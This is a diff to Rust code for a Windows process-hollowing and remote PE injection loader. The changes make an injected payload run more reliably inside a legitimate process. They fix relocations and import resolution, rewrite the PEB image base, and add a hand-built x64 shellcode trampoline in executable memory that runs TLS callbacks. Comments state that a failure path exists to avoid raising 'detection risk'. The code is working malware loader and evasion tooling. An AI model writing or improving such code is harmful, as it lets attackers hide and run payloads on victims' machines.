@@ -269,12 +269,17 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
     }
 
     if !base_addr_ptr.is_null() {
-        unsafe {
-            let res = NtUnmapViewOfSection(pi.hProcess, base_addr_ptr);
-            if res != 0 {
-                // This may fail if ASLR is not active, which is fine.
-                tracing::warn!("NtUnmapViewOfSection failed with status {:#x}", res);
-            }
+        let res = unsafe { NtUnmapViewOfSection(pi.hProcess, base_addr_ptr) };
+        if res != 0 {
+            // Failure to unmap the original image is unrecoverable: proceeding
+            // would leave the host code resident (increasing detection risk) and
+            // risk a failed VirtualAllocEx at the preferred ImageBase. Terminate
+            // the suspended process (the guard handles cleanup) and return an error.
+            return Err(anyhow!(
+                "NtUnmapViewOfSection failed with NTSTATUS {:#x}; aborting hollow to prevent \
+                 detection risk and degraded injection",
+                res
+            ));
         }
     }
 
@@ -307,6 +312,26 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
     } else {
         (image_base, false)
     };
+
+    // Update PEB.ImageBaseAddress to the new allocation so that
+    // GetModuleHandle(NULL), CRT init, and TLS access all see the correct base.
+    if !pbi.PebBaseAddress.is_null() {
+        #[cfg(target_arch = "x86_64")]
+        const IMAGE_BASE_OFFSET: usize = 0x10;
+        #[cfg(target_arch = "x86")]
+        const IMAGE_BASE_OFFSET: usize = 0x08;
+        let new_base_val = image_base as usize;
+        let mut peb_written: usize = 0;
+        unsafe {
+            WriteProcessMemory(
+                pi.hProcess,
+                (pbi.PebBaseAddress as usize + IMAGE_BASE_OFFSET) as *mut _,
+                &new_base_val as *const _ as *const _,
+                size_of::<usize>(),
+                &mut peb_written,
+            );
+        }
+    }
 
     // Copy headers
     let mut written: usize = 0;
@@ -406,38 +431,60 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
                     let reloc_type = entry >> 12;
                     let reloc_offset = entry & 0x0FFF;
 
-                    if reloc_type == IMAGE_REL_BASED_HIGHLOW || reloc_type == IMAGE_REL_BASED_DIR64 {
-                        let patch_addr = (image_base as usize
-                            + reloc_block_header.VirtualAddress as usize
-                            + reloc_offset as usize) as *mut isize;
-
-                        let mut original_addr: isize = 0;
+                    let patch_base = image_base as usize
+                        + reloc_block_header.VirtualAddress as usize
+                        + reloc_offset as usize;
+                    if reloc_type == IMAGE_REL_BASED_DIR64 {
+                        let patch_addr = patch_base as *mut c_void;
+                        let mut orig: i64 = 0;
                         let mut bytes_read: usize = 0;
                         unsafe {
                             if winapi::um::memoryapi::ReadProcessMemory(
                                 pi.hProcess,
-                                patch_addr as *const _,
-                                &mut original_addr as *mut _ as *mut _,
-                                size_of::<isize>(),
+                                patch_addr,
+                                &mut orig as *mut _ as *mut _,
+                                size_of::<i64>(),
                                 &mut bytes_read,
                             ) == 0 {
-                                continue; // Or handle error
+                                continue;
                             }
                         }
-
-                        let new_addr = original_addr + delta;
+                        let new_addr = orig + delta as i64;
                         let mut bytes_written: usize = 0;
                         unsafe {
-                            if WriteProcessMemory(
+                            WriteProcessMemory(
                                 pi.hProcess,
-                                patch_addr as *mut _,
+                                patch_addr,
                                 &new_addr as *const _ as *const _,
-                                size_of::<isize>(),
+                                size_of::<i64>(),
                                 &mut bytes_written,
-                            ) == 0
-                            {
-                                // Handle error
+                            );
+                        }
+                    } else if reloc_type == IMAGE_REL_BASED_HIGHLOW {
+                        let patch_addr = patch_base as *mut c_void;
+                        let mut orig: u32 = 0;
+                        let mut bytes_read: usize = 0;
+                        unsafe {
+                            if winapi::um::memoryapi::ReadProcessMemory(
+                                pi.hProcess,
+                                patch_addr,
+                                &mut orig as *mut _ as *mut _,
+                                size_of::<u32>(),
+                                &mut bytes_read,
+                            ) == 0 {
+                                continue;
                             }
+                        }
+                        let new_addr = (orig as i64 + delta as i64) as u32;
+                        let mut bytes_written: usize = 0;
+                        unsafe {
+                            WriteProcessMemory(
+                                pi.hProcess,
+                                patch_addr,
+                                &new_addr as *const _ as *const _,
+                                size_of::<u32>(),
+                                &mut bytes_written,
+                            );
                         }
                     }
                 }
@@ -496,15 +543,22 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
                 ));
             }
 
-            let mut thunk_offset = import_desc.FirstThunk as usize;
+            // OriginalFirstThunk (Characteristics) = ILT: holds name/ordinal RVAs and
+            // is never overwritten by the loader, so it is reliable for bound imports.
+            // FirstThunk = IAT: we overwrite this with the resolved addresses.
+            let orig_first_thunk = unsafe { *import_desc.u.Characteristics() } as usize;
+            let first_thunk = import_desc.FirstThunk as usize;
+            let ilt_base = if orig_first_thunk != 0 { orig_first_thunk } else { first_thunk };
+            let mut read_offset = ilt_base;
+            let mut write_offset = first_thunk;
             loop {
-                let remote_thunk_addr =
-                    (image_base as usize + thunk_offset) as *const c_void;
+                let remote_ilt_addr = (image_base as usize + read_offset) as *const c_void;
+                let remote_iat_addr = (image_base as usize + write_offset) as *mut c_void;
                 let mut func_addr_val: usize = 0;
                 unsafe {
                     if ReadProcessMemory(
                         pi.hProcess,
-                        remote_thunk_addr,
+                        remote_ilt_addr,
                         &mut func_addr_val as *mut _ as *mut c_void,
                         size_of::<usize>(),
                         &mut bytes_read,
@@ -544,7 +598,7 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
                 unsafe {
                     if WriteProcessMemory(
                         pi.hProcess,
-                        remote_thunk_addr as *mut _,
+                        remote_iat_addr,
                         &proc_addr as *const _ as *const _,
                         size_of::<usize>(),
                         &mut written,
@@ -553,7 +607,8 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
                         return Err(anyhow!("WriteProcessMemory for IAT failed"));
                     }
                 }
-                thunk_offset += size_of::<usize>();
+                read_offset += size_of::<usize>();
+                write_offset += size_of::<usize>();
             }
             import_desc_offset += size_of::<IMAGE_IMPORT_DESCRIPTOR>();
         }
@@ -598,7 +653,119 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
     }
 
 
-    let entry_point = image_base as usize + nt_headers.OptionalHeader.AddressOfEntryPoint as usize;
+    let mut entry_point =
+        image_base as usize + nt_headers.OptionalHeader.AddressOfEntryPoint as usize;
+
+    // Invoke TLS callbacks (IMAGE_DIRECTORY_ENTRY_TLS = 9) before resuming the
+    // main thread.  DLLs and EXEs compiled with __declspec(thread) / thread_local
+    // rely on these callbacks for correct static initialization.
+    //
+    // Strategy: generate a small x64 shellcode trampoline that calls each
+    // callback with (image_base, DLL_PROCESS_ATTACH=1, NULL) and then jumps to
+    // the real entry point.  The trampoline replaces the thread's initial RIP
+    // so the callbacks run on the main thread before any other code.
+    #[cfg(target_arch = "x86_64")]
+    {
+        const TLS_DIR_IDX: usize = 9;
+        const CALLBACKS_FIELD_OFFSET: usize = 3 * size_of::<usize>(); // 24 on x64
+        let tls_entry = &nt_headers.OptionalHeader.DataDirectory[TLS_DIR_IDX];
+        if tls_entry.VirtualAddress != 0 && tls_entry.Size > 0 {
+            // The TLS directory was already written to the remote process and
+            // base relocations were applied, so AddressOfCallBacks is a live VA.
+            let tls_dir_remote = image_base as usize + tls_entry.VirtualAddress as usize;
+            let callbacks_ptr_addr = tls_dir_remote + CALLBACKS_FIELD_OFFSET;
+            let mut addr_of_callbacks: usize = 0;
+            let mut bread: usize = 0;
+            let got_cb_ptr = unsafe {
+                ReadProcessMemory(
+                    pi.hProcess,
+                    callbacks_ptr_addr as *const _,
+                    &mut addr_of_callbacks as *mut _ as *mut _,
+                    size_of::<usize>(),
+                    &mut bread,
+                ) != 0
+                    && addr_of_callbacks != 0
+            };
+            if got_cb_ptr {
+                // Read the null-terminated callback VA array from the remote process.
+                let mut tls_callbacks: Vec<usize> = Vec::new();
+                let mut cb_ptr = addr_of_callbacks;
+                loop {
+                    let mut cb_fn: usize = 0;
+                    let mut b: usize = 0;
+                    if unsafe {
+                        ReadProcessMemory(
+                            pi.hProcess,
+                            cb_ptr as *const _,
+                            &mut cb_fn as *mut _ as *mut _,
+                            size_of::<usize>(),
+                            &mut b,
+                        )
+                    } == 0
+                        || cb_fn == 0
+                    {
+                        break;
+                    }
+                    tls_callbacks.push(cb_fn);
+                    cb_ptr += size_of::<usize>();
+                }
+                if !tls_callbacks.is_empty() {
+                    // Build a minimal x64 trampoline:
+                    //   For each callback:
+                    //     sub  rsp, 0x28          ; shadow space + alignment
+                    //     mov  rcx, <image_base>  ; DllBase
+                    //     mov  edx, 1             ; DLL_PROCESS_ATTACH
+                    //     xor  r8d, r8d           ; lpvReserved = NULL
+                    //     mov  rax, <cb_va>
+                    //     call rax
+                    //     add  rsp, 0x28
+                    //   mov  rax, <entry_point>
+                    //   jmp  rax
+                    let mut stub: Vec<u8> = Vec::new();
+                    let ib = image_base as usize as u64;
+                    for &cb in &tls_callbacks {
+                        stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp,0x28
+                        stub.push(0x48); stub.push(0xB9);                   // mov rcx, imm64
+                        stub.extend_from_slice(&ib.to_le_bytes());
+                        stub.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]); // mov edx,1
+                        stub.extend_from_slice(&[0x45, 0x31, 0xC0]);            // xor r8d,r8d
+                        stub.push(0x48); stub.push(0xB8);                   // mov rax, imm64
+                        stub.extend_from_slice(&(cb as u64).to_le_bytes());
+                        stub.extend_from_slice(&[0xFF, 0xD0]);              // call rax
+                        stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp,0x28
+                    }
+                    stub.push(0x48); stub.push(0xB8); // mov rax, imm64 (entry_point)
+                    stub.extend_from_slice(&(entry_point as u64).to_le_bytes());
+                    stub.extend_from_slice(&[0xFF, 0xE0]); // jmp rax
+
+                    let stub_mem = unsafe {
+                        VirtualAllocEx(
+                            pi.hProcess,
+                            std::ptr::null_mut(),
+                            stub.len(),
+                            MEM_COMMIT | MEM_RESERVE,
+                            PAGE_EXECUTE_READWRITE,
+                        )
+                    };
+                    if !stub_mem.is_null() {
+                        let mut tw: usize = 0;
+                        if unsafe {
+                            WriteProcessMemory(
+                                pi.hProcess,
+                                stub_mem,
+                                stub.as_ptr() as *const _,
+                                stub.len(),
+                                &mut tw,
+                            )
+                        } != 0
+                        {
+                            entry_point = stub_mem as usize;
+                        }
+                    }
+                }
+            }
+        }
+    }
 
     let mut ctx: CONTEXT = unsafe { zeroed() };
     ctx.ContextFlags = CONTEXT_FULL;
@@ -778,35 +945,60 @@ pub fn inject_into_process(process: HANDLE, payload: &[u8]) -> Result<()> {
                     let entry = unsafe { *(payload.as_ptr().add(entry_off) as *const u16) };
                     let reloc_type = entry >> 12;
                     let reloc_offset = entry & 0x0FFF;
-                    if reloc_type == IMAGE_REL_BASED_HIGHLOW
-                        || reloc_type == IMAGE_REL_BASED_DIR64
-                    {
-                        let patch_addr = (image_base as usize
-                            + block.VirtualAddress as usize
-                            + reloc_offset as usize)
-                            as *mut isize;
-                        let mut orig: isize = 0;
+                    let patch_base = image_base as usize
+                        + block.VirtualAddress as usize
+                        + reloc_offset as usize;
+                    if reloc_type == IMAGE_REL_BASED_DIR64 {
+                        let patch_addr = patch_base as *mut c_void;
+                        let mut orig: i64 = 0;
                         let mut bytes_read: usize = 0;
                         unsafe {
                             if ReadProcessMemory(
                                 process,
-                                patch_addr as *const _,
+                                patch_addr,
                                 &mut orig as *mut _ as *mut _,
-                                size_of::<isize>(),
+                                size_of::<i64>(),
                                 &mut bytes_read,
                             ) == 0
                             {
                                 continue;
                             }
                         }
-                        let patched = orig + delta;
+                        let patched = orig + delta as i64;
                         let mut bytes_written: usize = 0;
                         unsafe {
                             WriteProcessMemory(
                                 process,
-                                patch_addr as *mut _,
+                                patch_addr,
                                 &patched as *const _ as *const _,
-                                size_of::<isize>(),
+                                size_of::<i64>(),
+                                &mut bytes_written,
+                            );
+                        }
+                    } else if reloc_type == IMAGE_REL_BASED_HIGHLOW {
+                        let patch_addr = patch_base as *mut c_void;
+                        let mut orig: u32 = 0;
+                        let mut bytes_read: usize = 0;
+                        unsafe {
+                            if ReadProcessMemory(
+                                process,
+                                patch_addr,
+                                &mut orig as *mut _ as *mut _,
+                                size_of::<u32>(),
+                                &mut bytes_read,
+                            ) == 0
+                            {
+                                continue;
+                            }
+                        }
+                        let patched = (orig as i64 + delta as i64) as u32;
+                        let mut bytes_written: usize = 0;
+                        unsafe {
+                            WriteProcessMemory(
+                                process,
+                                patch_addr,
+                                &patched as *const _ as *const _,
+                                size_of::<u32>(),
                                 &mut bytes_written,
                             );
                         }
@@ -860,14 +1052,22 @@ pub fn inject_into_process(process: HANDLE, payload: &[u8]) -> Result<()> {
                 ));
             }
 
-            let mut thunk_offset = import_desc.FirstThunk as usize;
+            // OriginalFirstThunk (Characteristics) = ILT: holds name/ordinal RVAs and
+            // is never overwritten by the loader, so it is reliable for bound imports.
+            // FirstThunk = IAT: we overwrite this with the resolved addresses.
+            let orig_first_thunk = unsafe { *import_desc.u.Characteristics() } as usize;
+            let first_thunk = import_desc.FirstThunk as usize;
+            let ilt_base = if orig_first_thunk != 0 { orig_first_thunk } else { first_thunk };
+            let mut read_offset = ilt_base;
+            let mut write_offset = first_thunk;
             loop {
-                let remote_thunk_addr = (image_base as usize + thunk_offset) as *const c_void;
+                let remote_ilt_addr = (image_base as usize + read_offset) as *const c_void;
+                let remote_iat_addr = (image_base as usize + write_offset) as *mut c_void;
                 let mut func_addr_val: usize = 0;
                 unsafe {
                     if ReadProcessMemory(
                         process,
-                        remote_thunk_addr,
+                        remote_ilt_addr,
                         &mut func_addr_val as *mut _ as *mut c_void,
                         size_of::<usize>(),
                         &mut bytes_read,
@@ -903,7 +1103,7 @@ pub fn inject_into_process(process: HANDLE, payload: &[u8]) -> Result<()> {
                 unsafe {
                     if WriteProcessMemory(
                         process,
-                        remote_thunk_addr as *mut _,
+                        remote_iat_addr,
                         &proc_addr as *const _ as *const _,
                         size_of::<usize>(),
                         &mut written,
@@ -912,7 +1112,8 @@ pub fn inject_into_process(process: HANDLE, payload: &[u8]) -> Result<()> {
                         return Err(anyhow!("WriteProcessMemory(IAT) failed"));
                     }
                 }
-                thunk_offset += size_of::<usize>();
+                read_offset += size_of::<usize>();
+                write_offset += size_of::<usize>();
             }
             import_desc_offset += size_of::<IMAGE_IMPORT_DESCRIPTOR>();
         }
